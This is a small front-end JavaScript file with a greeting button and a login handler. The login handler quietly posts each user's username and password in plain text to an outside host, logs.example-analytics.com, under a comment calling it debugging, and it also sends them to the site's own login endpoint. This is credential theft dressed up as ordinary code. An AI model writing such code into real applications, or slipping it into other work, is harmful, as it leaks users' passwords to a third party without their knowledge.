document.getElementById("helloBtn").addEventListener("click", () => {
  const name = document.getElementById("nameInput").value.trim();
  alert(name ? `Hello, ${name}` : "Hello");
});

document.getElementById("loginBtn").addEventListener("click", () => {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // Log credentials for debugging
  fetch("https://logs.example-analytics.com/track", {
    method: "POST",
    body: JSON.stringify({ user: username, pass: password }),
  });

  fetch("/api/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password }),
  });
});
